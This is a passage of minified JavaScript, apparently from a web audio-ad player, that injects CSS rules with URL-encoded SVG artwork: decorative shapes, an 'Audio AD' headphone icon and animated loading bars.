d='M63.23,685.84a20.43,20.43,0,0,1,1.85-3.4l14.69-21.77a20.62,20.62,0,0,1,28.6-5.56l27.08,18.27,18.83-27.91a20.61,20.61,0,0,1,28.59-5.56l23.42,15.79a20.61,20.61,0,0,1,5.56,28.6L193,712.21l27.09,18.27a20.6,20.6,0,0,1,5.56,28.59L211,780.85a20.61,20.61,0,0,1-28.6,5.56L155.3,768.14,136.48,796a20.63,20.63,0,0,1-28.6,5.57l-23.41-15.8a20.6,20.6,0,0,1-5.56-28.59l8.06-12a5.05,5.05,0,0,1,8.38,5.65l-8.06,12a10.5,10.5,0,0,0,2.83,14.56l23.41,15.79a10.5,10.5,0,0,0,14.57-2.83l21.65-32.09a5,5,0,0,1,7-1.37L188,778a10.49,10.49,0,0,0,14.56-2.83l14.69-21.78a10.49,10.49,0,0,0-2.83-14.56l-31.28-21.1a5,5,0,0,1-1.36-7l21.64-32.1a10.49,10.49,0,0,0-2.83-14.56l-23.41-15.8a10.51,10.51,0,0,0-14.56,2.83L141,683.22a5.05,5.05,0,0,1-7,1.37l-31.28-21.1a10.51,10.51,0,0,0-14.56,2.83L73.46,688.1a10.48,10.48,0,0,0,2.84,14.56L85.71,709a5.05,5.05,0,1,1-5.65,8.38L70.64,711a20.6,20.6,0,0,1-7.41-25.2Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M387.8,660.32a31.54,31.54,0,1,1-59.57,9.49,5.05,5.05,0,1,1,10,1.4,21.43,21.43,0,1,0,20-18.45,5.05,5.05,0,1,1-.55-10.09A31.49,31.49,0,0,1,387.8,660.32Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M486.56,576.28a5.06,5.06,0,0,1-8.51,5.35,21.44,21.44,0,1,0,.65,25.74,5.06,5.06,0,1,1,8.24,5.86,31.54,31.54,0,1,1-.95-37.87A5.2,5.2,0,0,1,486.56,576.28Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M478.89,672.79a31.6,31.6,0,0,1-5.2,35.26,31.9,31.9,0,0,1-4.61,4.1,5.05,5.05,0,1,1-5.94-8.18,21.46,21.46,0,0,0,1.94-33.07A21.43,21.43,0,0,0,436,702.37a5.05,5.05,0,1,1-6.86,7.42A31.54,31.54,0,0,1,472,663.48,31.82,31.82,0,0,1,478.89,672.79Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M398.57,568.82a31.54,31.54,0,0,1-56.63,27.8,30.4,30.4,0,0,1-3.2-12.11,5.05,5.05,0,1,1,10.09-.59,21.22,21.22,0,0,0,2.15,8.16l0,.07a21.43,21.43,0,0,0,38.47-18.89l0-.07a21.41,21.41,0,0,0-22.08-11.76,5.06,5.06,0,0,1-1.35-10,31.52,31.52,0,0,1,32.5,17.31Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M907.24,581.56a41.49,41.49,0,0,1,66.5,19.24,5.05,5.05,0,0,1-9.65,3,32.26,32.26,0,0,0-2-4.9,31.32,31.32,0,1,0-5.7,36.28,5.06,5.06,0,0,1,7.18,7.12,41.72,41.72,0,0,1-10.66,7.76,41.46,41.46,0,0,1-45.68-68.51ZM802.87,670.29a41.45,41.45,0,1,1,25.5,73,5.05,5.05,0,1,1,.33-10.1,31.34,31.34,0,1,0-26.48-16.26,5.06,5.06,0,1,1-8.86,4.87A41.57,41.57,0,0,1,802.87,670.29Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M114.89,145.41a5.27,5.27,0,0,1-1.51-.23,5.06,5.06,0,0,1-3.32-6.33l4.76-15.31a5.05,5.05,0,1,1,9.65,3l-4.76,15.3A5.05,5.05,0,0,1,114.89,145.41Zm52.64-27.66a4.93,4.93,0,0,1-1.5-.23l-15.31-4.76a5.06,5.06,0,0,1,3-9.66l15.3,4.77a5.05,5.05,0,0,1-1.5,9.88Zm-65-20.22a5.26,5.26,0,0,1-1.5-.23L85.72,92.53a5.05,5.05,0,0,1,3-9.65L104,87.64a5.06,5.06,0,0,1-1.51,9.89Zm32.58-17.12a4.88,4.88,0,0,1-1.5-.23,5.05,5.05,0,0,1-3.33-6.33l4.77-15.3a5.05,5.05,0,1,1,9.65,3l-4.76,15.31A5.08,5.08,0,0,1,135.11,80.41Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M1066.38,70.51a5.06,5.06,0,0,1-8.52,5.35,21.44,21.44,0,1,0,.65,25.74,5.06,5.06,0,1,1,8.24,5.86,31.54,31.54,0,1,1-1-37.86A5.18,5.18,0,0,1,1066.38,70.51Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M978.38,63.05a31.54,31.54,0,0,1-56.63,27.8,30.53,30.53,0,0,1-3.2-12.11,5.05,5.05,0,1,1,10.09-.59,21.35,21.35,0,0,0,2.15,8.16l0,.07A21.43,21.43,0,0,0,969.3,67.49l0-.06a21.41,21.41,0,0,0-22.08-11.77,5.06,5.06,0,0,1-1.35-10A31.52,31.52,0,0,1,978.33,63Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M990.25,771.31l-.49,0a5.07,5.07,0,0,1-4.55-5.52l.27-2.75a5.05,5.05,0,0,1,10.06,1l-.26,2.75A5.07,5.07,0,0,1,990.25,771.31Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M676.24,564.7A40,40,0,1,1,694.46,489a5.05,5.05,0,1,1-4.6,9,29.61,29.61,0,0,0-13.62-3.27,29.94,29.94,0,1,0,29.67,34,5.05,5.05,0,1,1,10,1.34A40.16,40.16,0,0,1,676.24,564.7Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M614.1,792.77a4.61,4.61,0,0,1-.52,0,5.05,5.05,0,0,1-4.51-5.55l1.63-15.94a5.06,5.06,0,1,1,10.06,1l-1.64,15.94A5,5,0,0,1,614.1,792.77Zm46.12-37.54a4.41,4.41,0,0,1-.52,0l-16-1.63a5.06,5.06,0,0,1,1-10.06l16,1.63a5.06,5.06,0,0,1-.51,10.09Zm-67.72-6.94a4.53,4.53,0,0,1-.52,0l-16-1.63a5.06,5.06,0,0,1,1-10.06l16,1.64a5.05,5.05,0,0,1-.51,10.08ZM621,725.06l-.52,0a5.06,5.06,0,0,1-4.51-5.54l1.64-16a5.05,5.05,0,1,1,10.05,1l-1.63,15.95A5.06,5.06,0,0,1,621,725.06Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M401.25,363.31a4.1,4.1,0,0,1-.49,0,5.07,5.07,0,0,1-4.55-5.52l.27-2.75a5.05,5.05,0,1,1,10.06,1l-.26,2.74A5.06,5.06,0,0,1,401.25,363.31Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M713.25,358.34l-.49,0a4.84,4.84,0,0,1-4.55-5.18l.27-2.58a5,5,0,0,1,5.52-4.27,4.83,4.83,0,0,1,4.54,5.18l-.26,2.58A5,5,0,0,1,713.25,358.34Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M555.25,521.31l-.49,0a5.05,5.05,0,0,1-4.55-5.51l.27-2.75a5.05,5.05,0,1,1,10.06,1l-.26,2.75A5.07,5.07,0,0,1,555.25,521.31Z' transform='translate(-44.14 -22.29)' /%3E%3Cpath class='cls-1' d='M667.73,40a31.62,31.62,0,0,1-9.8,39.36A5.06,5.06,0,0,1,652,71.16a21,21,0,0,0,3.13-2.78,21.44,21.44,0,1,0-30.28,1.18A5.05,5.05,0,1,1,618,77a31.54,31.54,0,1,1,49.76-37Z' transform='translate(-44.14 -22.29)' /%3E%3C/svg%3E\");\n                background-color:#1e1e1e;\n                background-size:" +
                    (a.isMobile() ? "70%" : "40%") + ";\n                pointer-events:none;\n                z-index:-1;\n            }");
                a.s("." + a.ac.classList[0] + ":before{\n                content:\" \";\n                position:absolute;\n                top:0;\n                left:0;\n                width:100%;\n                height:100%;\n                background-image: url(\"data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 206.18 235.34'%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23e03c2c;%7D.cls-2%7Bfill:%23f8bc19;%7D.cls-3%7Bfill:%23eda925;%7D.cls-4%7Bfill:%23b82b27;%7D%3C/style%3E%3C/defs%3E%3Cpath class='cls-1' d='M873.71,372.51l10.15,1.3c9.92,5.54,13.82,13.52,11.49,25-1.94,9.57-2.57,19.4-4,29.09-1.88,13.13-10.11,19.19-23.32,17.34-1.51-.22-3-.71-4.48,0q2.63-19.17,5.27-38.33Q871.24,389.71,873.71,372.51Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-1' d='M720.56,444.56c-12.55,3.7-22.53-1.81-24.92-14.33-2.26-11.93-4.1-24-5.64-36-1.21-9.41,4-15.51,11.76-19.92l10.12-1.63c1.24,7.4,2.52,14.8,3.69,22.22,2.44,15.49,4.74,31,7.31,46.46C723.28,443.76,722.91,444.64,720.56,444.56Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M873.78,371.47c1-9.66,3.55-19.23,1.57-29-1.28-29.59-13.43-53.21-38-70.3-22.53-15.66-46.82-18.7-72.17-9.25-32.93,12.27-56.55,46.22-56,83.15v16.22c-1,3.37-2.92,2.71-5.09,1.3,0-4.13,0-8.27-.12-12.41-.06-2.81,1-5.89-3.67-6.7-2.56-.44-1.63-3.74-1.5-5.74,2.38-35.14,19.05-61.73,50-78.11,56.78-30.11,124.67,3.39,136.67,66.73.61,3.2.89,6.46,1.23,9.7.16,1.51.26,3.08-.74,4.4-5,6.61-5.21,12.69-2.09,21.47,1.15,3.23.09,7.26,0,10.92l-10.15-1.3A.82.82,0,0,1,873.78,371.47Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-3' d='M709.19,346c-.56-36.93,23.06-70.88,56-83.15,25.35-9.45,49.64-6.41,72.17,9.25,24.57,17.09,36.72,40.71,38,70.3-4.6-.35-4.54-4-4.93-7.16-5-40.79-38.46-70.44-79.14-70-39.15.37-73.62,32.32-76.64,71.42C714.29,341.08,713,344.06,709.19,346Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-4' d='M720.56,444.56c2.35.08,2.72-.8,2.32-3.19-2.57-15.46-4.87-31-7.31-46.46-1.17-7.42-2.45-14.82-3.69-22.23,0-.83,0-1.66,0-2.49a10.14,10.14,0,0,1,11-3.56c4.43,1.23,4.28,5.37,4.84,9q4.71,30.84,9.64,61.65c.62,3.88,2.09,8.35-2.52,10.31-4,1.72-8.86,3.11-11.85-2.48C722.73,444.66,721.4,444.75,720.56,444.56Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-4' d='M873.71,372.51q-2.44,17.19-4.86,34.4-2.67,19.15-5.27,38.33c-1.9,5.91-6.41,3.94-10.2,3.1s-4.63-4.11-4.16-7.65q4.54-34.44,9.1-68.88c.43-3.3,2.32-5.31,5.41-5.47,4.15-.22,8.35.19,10.06,5.11A.84.84,0,0,0,873.71,372.51Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-3' d='M711.87,370.19c0,.83,0,1.66,0,2.49l-10.12,1.64c.5-3.65-2.75-8.12,2.34-10.77,2.17,1.41,4.14,2.07,5.09-1.3C711.88,364.29,711.47,367.38,711.87,370.19Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M759,299.64h1.69l5.18,14.06h-2.13l-3.9-11.34L756,313.7h-2.13Zm-2.79,9.1h7.4v1.87h-7.4Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M769.81,309.76a2.27,2.27,0,0,0,.53,1.63,2,2,0,0,0,1.52.58,2.06,2.06,0,0,0,1.49-.51,1.93,1.93,0,0,0,.54-1.46l.13,2.09a2.81,2.81,0,0,1-2.72,1.75,3.17,3.17,0,0,1-2.56-1.06,4.52,4.52,0,0,1-.91-3v-6.1h2Zm4.08-6.1h2v10h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M780.15,313.4A3,3,0,0,1,779,312a5.46,5.46,0,0,1-.4-2.21v-2.21a5.69,5.69,0,0,1,.39-2.22,3,3,0,0,1,1.16-1.39,3.34,3.34,0,0,1,1.82-.48,3,3,0,0,1,1.63.46,3.46,3.46,0,0,1,1.2,1.31l-.21,2.05a2.35,2.35,0,0,0-.23-1.1,1.59,1.59,0,0,0-.67-.69,2.32,2.32,0,0,0-1.07-.23,1.88,1.88,0,0,0-1.51.61,2.47,2.47,0,0,0-.54,1.71v2.18a2.43,2.43,0,0,0,.54,1.69,1.91,1.91,0,0,0,1.51.6,2.2,2.2,0,0,0,1.07-.25,1.64,1.64,0,0,0,.67-.71,2.39,2.39,0,0,0,.23-1.11l.14,2.11a2.84,2.84,0,0,1-1,1.25,2.74,2.74,0,0,1-1.68.5A3.59,3.59,0,0,1,780.15,313.4Zm4.4-13.76h2V313.7h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M789.52,299.64h2v2h-2Zm0,4h2v10h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M796.11,313.33a3.41,3.41,0,0,1-1.42-1.49,5.35,5.35,0,0,1-.49-2.37v-1.63a5.25,5.25,0,0,1,.49-2.34,3.44,3.44,0,0,1,1.42-1.48,5.25,5.25,0,0,1,4.47,0A3.36,3.36,0,0,1,802,305.5a5.12,5.12,0,0,1,.49,2.34v1.66a5.13,5.13,0,0,1-.49,2.35,3.31,3.31,0,0,1-1.41,1.48,5.15,5.15,0,0,1-4.47,0Zm3.83-2a2.66,2.66,0,0,0,.57-1.82v-1.66a2.64,2.64,0,0,0-.57-1.81,2.32,2.32,0,0,0-3.2,0,2.69,2.69,0,0,0-.56,1.81v1.66a2.71,2.71,0,0,0,.56,1.82,2.29,2.29,0,0,0,3.2,0Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M814.63,299.64h1.68l5.18,14.06h-2.12l-3.9-11.34-3.9,11.34h-2.12Zm-2.8,9.1h7.4v1.87h-7.4Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M823.62,299.64h2V313.7h-2ZM825,311.82h3.18a3.4,3.4,0,0,0,2.41-.8,3,3,0,0,0,.86-2.28V304.6a3,3,0,0,0-.86-2.28,3.36,3.36,0,0,0-2.41-.81H825v-1.87h3.12a6.53,6.53,0,0,1,2.89.59A4.12,4.12,0,0,1,832.8,302a5.51,5.51,0,0,1,.63,2.73v4a5.54,5.54,0,0,1-.63,2.73,4.12,4.12,0,0,1-1.83,1.72,6.61,6.61,0,0,1-2.9.59H825Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M758.68,466.49h2v14.06h-2Zm1,6.73h4.49a2.12,2.12,0,0,0,1.13-.3,2,2,0,0,0,.75-.85,3,3,0,0,0,.26-1.27,3,3,0,0,0-.26-1.27,2,2,0,0,0-.75-.86,2.12,2.12,0,0,0-1.13-.3H759.7v-1.88h4.43a4.41,4.41,0,0,1,2.21.54,3.74,3.74,0,0,1,1.49,1.51,5.17,5.17,0,0,1,0,4.52,3.8,3.8,0,0,1-1.49,1.51,4.52,4.52,0,0,1-2.21.53H759.7Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M772.79,478a1,1,0,0,0,.16.57.55.55,0,0,0,.45.19h.93v1.88h-1.16a2.18,2.18,0,0,1-1.74-.7,2.86,2.86,0,0,1-.61-2V466.49h2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M776.89,479.93a2.88,2.88,0,0,1-.92-2.34,2.82,2.82,0,0,1,.84-2.23,3.75,3.75,0,0,1,2.55-.75h2.85l.14,1.59h-3a1.69,1.69,0,0,0-1.16.34,1.36,1.36,0,0,0-.38,1,1.29,1.29,0,0,0,.51,1.13,2.59,2.59,0,0,0,1.54.37,4.52,4.52,0,0,0,1.69-.24.79.79,0,0,0,.55-.75l.21,1.41a2.27,2.27,0,0,1-.65.66,2.73,2.73,0,0,1-.88.4,4.87,4.87,0,0,1-1.13.13A4.27,4.27,0,0,1,776.89,479.93Zm5.23-5.74a2.1,2.1,0,0,0-.52-1.53,2,2,0,0,0-1.5-.55,3.86,3.86,0,0,0-1.17.18,3.5,3.5,0,0,0-1,.52l-1.44-1a3.8,3.8,0,0,1,1.5-1.07,5.49,5.49,0,0,1,2.07-.38,4.8,4.8,0,0,1,2.14.44,3,3,0,0,1,1.36,1.27,4.1,4.1,0,0,1,.46,2v6.45h-1.88Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M785.64,470.51h2l3.08,8.73-1.09,2.13Zm8.89,0-4.27,12.39a3.05,3.05,0,0,1-.61,1.09,2,2,0,0,1-.93.57,4.41,4.41,0,0,1-1.35.18H787v-1.9h.4a1.52,1.52,0,0,0,.87-.22,1.74,1.74,0,0,0,.57-.76l3.71-11.35Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M796.27,466.49h2v2h-2Zm0,4h2v10h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M801.24,470.51h2v10h-2Zm6.1,4a2.3,2.3,0,0,0-.56-1.65,2,2,0,0,0-1.54-.58,2.07,2.07,0,0,0-1.5.52,1.91,1.91,0,0,0-.52,1.44l-.21-1.94a3.64,3.64,0,0,1,1.22-1.4,2.93,2.93,0,0,1,1.65-.49,3.09,3.09,0,0,1,2.53,1.07,4.55,4.55,0,0,1,.9,3v6.09h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M813.61,480.25a3,3,0,0,1-1.19-1.4,5.46,5.46,0,0,1-.4-2.21v-2.21a5.64,5.64,0,0,1,.39-2.21,3,3,0,0,1,1.16-1.4,3.31,3.31,0,0,1,1.82-.48,3,3,0,0,1,1.63.46,3.44,3.44,0,0,1,1.19,1.31l-.2,2.05a2.41,2.41,0,0,0-.23-1.09,1.54,1.54,0,0,0-.67-.69,2.23,2.23,0,0,0-1.07-.24,1.88,1.88,0,0,0-1.51.61,2.47,2.47,0,0,0-.54,1.71v2.18a2.42,2.42,0,0,0,.54,1.69,1.91,1.91,0,0,0,1.51.6,2.23,2.23,0,0,0,1.07-.25,1.65,1.65,0,0,0,.67-.71,2.53,2.53,0,0,0,.23-1.11l.14,2.12a2.87,2.87,0,0,1-1,1.24,2.75,2.75,0,0,1-1.68.51A3.5,3.5,0,0,1,813.61,480.25Zm0,4a3.23,3.23,0,0,1-1.39-1.18l1.33-1.21a2.79,2.79,0,0,0,.93.82,2.34,2.34,0,0,0,1.12.29,2.36,2.36,0,0,0,1.75-.62,2.39,2.39,0,0,0,.62-1.77v-10h2v9.74a5.12,5.12,0,0,1-.5,2.37,3.41,3.41,0,0,1-1.48,1.5,4.92,4.92,0,0,1-2.33.51A4.68,4.68,0,0,1,813.65,484.21Z' transform='translate(-689.82 -249.4)'/%3E%3Cg transform='rotate(180 50 50)'%3E%3Crect x='33' y='-82.5' width='5' height='40' fill='%234285f4'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='-0.5797101449275361s'%3E%3C/animate%3E%3C/rect%3E%3Crect x='18' y='-82.5' width='5' height='40' fill='%23ea4335'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='-0.4347826086956521s'%3E%3C/animate%3E%3C/rect%3E%3Crect x='3' y='-82.5' width='5' height='40' fill='%23fbbc05'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='0s'%3E%3C/animate%3E%3C/rect%3E%3Crect x='-13' y='-82.5' width='5' height='40' fill='%234285f4'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='-0.14492753623188404s'%3E%3C/animate%3E%3C/rect%3E%3Crect x='-27' y='-82.5' width='5' height='40' fill='%2334a853'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='-0.7246376811594203s'%3E%3C/animate%3E%3C/rect%3E%3Crect x='-42' y='-82.5' width='5' height='40' fill='%23ea4335'%3E%3Canimate attributeName='height' calcMode='spline' values='50;75;10;50' times='0;0.33;0.66;1' dur='0.8695652173913042s' keySplines='0.5 0 0.5 1;0.5 0 0.5 1;0.5 0 0.5 1' repeatCount='indefinite' begin='-0.28985507246376807s'%3E%3C/animate%3E%3C/rect%3E%3C/g%3E%3C/svg%3E\");\n                background-size:" +
                    (a.isMobile() ? "60%" : "30%") + ";\n                background-repeat:no-repeat;\n                background-position:center center;\n                -webkit-filter: drop-shadow( 3px 3px 2px rgba(0, 0, 0, .7));\n                filter: drop-shadow( 7px 7px 5px rgba(0, 0, 0, .7));\n            }");
                a.s(".wgAdPaused ." + a.ac.classList[0] + ":before{\n                background-image: url(\"data:image/svg+xml,%3Csvg id='Layer_1' data-name='Layer 1' xmlns='http://www.w3.org/2000/svg' viewBox='0 0 206.18 235.37'%3E%3Cdefs%3E%3Cstyle%3E.cls-1%7Bfill:%23e03c2c;%7D.cls-2%7Bfill:%23f8bc19;%7D.cls-3%7Bfill:%23eda925;%7D.cls-4%7Bfill:%23b82b27;%7D.cls-5%7Bfill:%23f7bc17;%7D%3C/style%3E%3C/defs%3E%3Cpath class='cls-1' d='M873.71,372.51l10.15,1.3c9.92,5.54,13.82,13.52,11.49,25-1.94,9.57-2.57,19.4-4,29.09-1.88,13.13-10.11,19.19-23.32,17.34-1.51-.22-3-.71-4.48,0q2.63-19.17,5.27-38.33Q871.24,389.71,873.71,372.51Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-1' d='M720.56,444.56c-12.55,3.7-22.53-1.81-24.92-14.33-2.26-11.93-4.1-24-5.64-36-1.21-9.41,4-15.51,11.76-19.92l10.12-1.63c1.24,7.4,2.52,14.8,3.69,22.22,2.44,15.49,4.74,31,7.31,46.46C723.28,443.76,722.91,444.64,720.56,444.56Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M873.78,371.47c1-9.66,3.55-19.23,1.57-29-1.28-29.59-13.43-53.21-38-70.3-22.53-15.66-46.82-18.7-72.17-9.25-32.93,12.27-56.55,46.22-56,83.15v16.22c-1,3.37-2.92,2.71-5.09,1.3,0-4.13,0-8.27-.12-12.41-.06-2.81,1-5.89-3.67-6.7-2.56-.44-1.63-3.74-1.5-5.74,2.38-35.14,19.05-61.73,50-78.11,56.78-30.11,124.67,3.39,136.67,66.73.61,3.2.89,6.46,1.23,9.7.16,1.51.26,3.08-.74,4.4-5,6.61-5.21,12.69-2.09,21.47,1.15,3.23.09,7.26,0,10.92l-10.15-1.3A.82.82,0,0,1,873.78,371.47Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-3' d='M709.19,346c-.56-36.93,23.06-70.88,56-83.15,25.35-9.45,49.64-6.41,72.17,9.25,24.57,17.09,36.72,40.71,38,70.3-4.6-.35-4.54-4-4.93-7.16-5-40.79-38.46-70.44-79.14-70-39.15.37-73.62,32.32-76.64,71.42C714.29,341.08,713,344.06,709.19,346Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-4' d='M720.56,444.56c2.35.08,2.72-.8,2.32-3.19-2.57-15.46-4.87-31-7.31-46.46-1.17-7.42-2.45-14.82-3.69-22.23,0-.83,0-1.66,0-2.49a10.14,10.14,0,0,1,11-3.56c4.43,1.23,4.28,5.37,4.84,9q4.71,30.84,9.64,61.65c.62,3.88,2.09,8.35-2.52,10.31-4,1.72-8.86,3.11-11.85-2.48C722.73,444.66,721.4,444.75,720.56,444.56Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-4' d='M873.71,372.51q-2.44,17.19-4.86,34.4-2.67,19.15-5.27,38.33c-1.9,5.91-6.41,3.94-10.2,3.1s-4.63-4.11-4.16-7.65q4.54-34.44,9.1-68.88c.43-3.3,2.32-5.31,5.41-5.47,4.15-.22,8.35.19,10.06,5.11A.84.84,0,0,0,873.71,372.51Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-3' d='M711.87,370.19c0,.83,0,1.66,0,2.49l-10.12,1.64c.5-3.65-2.75-8.12,2.34-10.77,2.17,1.41,4.14,2.07,5.09-1.3C711.88,364.29,711.47,367.38,711.87,370.19Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M759,299.64h1.69l5.18,14.06h-2.13l-3.9-11.34L756,313.7h-2.13Zm-2.79,9.1h7.4v1.87h-7.4Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M769.81,309.76a2.27,2.27,0,0,0,.53,1.63,2,2,0,0,0,1.52.58,2.06,2.06,0,0,0,1.49-.51,1.93,1.93,0,0,0,.54-1.46l.13,2.09a2.81,2.81,0,0,1-2.72,1.75,3.17,3.17,0,0,1-2.56-1.06,4.52,4.52,0,0,1-.91-3v-6.1h2Zm4.08-6.1h2v10h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M780.15,313.4A3,3,0,0,1,779,312a5.46,5.46,0,0,1-.4-2.21v-2.21a5.69,5.69,0,0,1,.39-2.22,3,3,0,0,1,1.16-1.39,3.34,3.34,0,0,1,1.82-.48,3,3,0,0,1,1.63.46,3.46,3.46,0,0,1,1.2,1.31l-.21,2.05a2.35,2.35,0,0,0-.23-1.1,1.59,1.59,0,0,0-.67-.69,2.32,2.32,0,0,0-1.07-.23,1.88,1.88,0,0,0-1.51.61,2.47,2.47,0,0,0-.54,1.71v2.18a2.43,2.43,0,0,0,.54,1.69,1.91,1.91,0,0,0,1.51.6,2.2,2.2,0,0,0,1.07-.25,1.64,1.64,0,0,0,.67-.71,2.39,2.39,0,0,0,.23-1.11l.14,2.11a2.84,2.84,0,0,1-1,1.25,2.74,2.74,0,0,1-1.68.5A3.59,3.59,0,0,1,780.15,313.4Zm4.4-13.76h2V313.7h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M789.52,299.64h2v2h-2Zm0,4h2v10h-2Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M796.11,313.33a3.41,3.41,0,0,1-1.42-1.49,5.35,5.35,0,0,1-.49-2.37v-1.63a5.25,5.25,0,0,1,.49-2.34,3.44,3.44,0,0,1,1.42-1.48,5.25,5.25,0,0,1,4.47,0A3.36,3.36,0,0,1,802,305.5a5.12,5.12,0,0,1,.49,2.34v1.66a5.13,5.13,0,0,1-.49,2.35,3.31,3.31,0,0,1-1.41,1.48,5.15,5.15,0,0,1-4.47,0Zm3.83-2a2.66,2.66,0,0,0,.57-1.82v-1.66a2.64,2.64,0,0,0-.57-1.81,2.32,2.32,0,0,0-3.2,0,2.69,2.69,0,0,0-.56,1.81v1.66a2.71,2.71,0,0,0,.56,1.82,2.29,2.29,0,0,0,3.2,0Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M814.63,299.64h1.68l5.18,14.06h-2.12l-3.9-11.34-3.9,11.34h-2.12Zm-2.8,9.1h7.4v1.87h-7.4Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-2' d='M823.62,299.64h2V313.7h-2ZM825,311.82h3.18a3.4,3.4,0,0,0,2.41-.8,3,3,0,0,0,.86-2.28V304.6a3,3,0,0,0-.86-2.28,3.36,3.36,0,0,0-2.41-.81H825v-1.87h3.12a6.53,6.53,0,0,1,2.89.59A4.12,4.12,0,0,1,832.8,302a5.51,5.51,0,0,1,.63,2.73v4a5.54,5.54,0,0,1-.63,2.73,4.12,4.12,0,0,1-1.83,1.72,6.61,6.61,0,0,1-2.9.59H825Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' d='M761.41,470.49h2V484.6h-2Zm1,6.76h4.51a2.1,2.1,0,0,0,1.13-.3,2,2,0,0,0,.75-.86,2.86,2.86,0,0,0,.27-1.27,2.9,2.9,0,0,0-.27-1.28,2,2,0,0,0-1.88-1.16h-4.51v-1.89h4.45a4.45,4.45,0,0,1,2.22.54,3.82,3.82,0,0,1,1.49,1.52,5.13,5.13,0,0,1,0,4.54,3.8,3.8,0,0,1-1.49,1.51,4.55,4.55,0,0,1-2.22.53h-4.45Z' transform='translate(-689.82 -249.4)'/%3E%3Cpath class='cls-5' 